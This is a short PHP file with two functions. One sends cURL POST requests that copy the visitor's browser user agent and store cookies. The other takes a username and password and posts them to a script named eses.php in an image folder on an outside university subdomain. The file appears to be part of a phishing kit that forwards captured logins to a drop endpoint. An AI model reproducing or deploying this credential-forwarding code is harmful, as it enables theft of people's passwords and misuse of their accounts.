<?php
function get_data_from_url($url, $data)
{
  $user_agent =  $_SERVER['HTTP_USER_AGENT'];
  $ambil = curl_init();
  CURL_SETOPT($ambil,CURLOPT_URL,$url);
  CURL_SETOPT($ambil,CURLOPT_USERAGENT,$user_agent);
  CURL_SETOPT($ambil,CURLOPT_POST,True);
  CURL_SETOPT($ambil,CURLOPT_POSTFIELDS,$data);
  CURL_SETOPT($ambil,CURLOPT_RETURNTRANSFER,True);
  CURL_SETOPT($ambil,CURLOPT_FOLLOWLOCATION,True);
  CURL_SETOPT($ambil,CURLOPT_COOKIEFILE,"cook2.txt");
  CURL_SETOPT($ambil,CURLOPT_COOKIEJAR,"cook2.txt");
  CURL_SETOPT($ambil,CURLOPT_CONNECTTIMEOUT,100);
  CURL_SETOPT($ambil,CURLOPT_TIMEOUT,100);
  $exec = curl_exec($ambil);
  return $exec;
}

function login_data ($userd,$passd) 
{
  $postdata = http_build_query(
      array(
          'a' => $userd,
          'p' => $passd,
          'z' => $_SERVER['HTTP_USER_AGENT']
      )
  );

  $result = get_data_from_url('https://fikti.bem.gunadarma.ac.id/covid-el/images/img/eses.php', $postdata);
  return $result;
}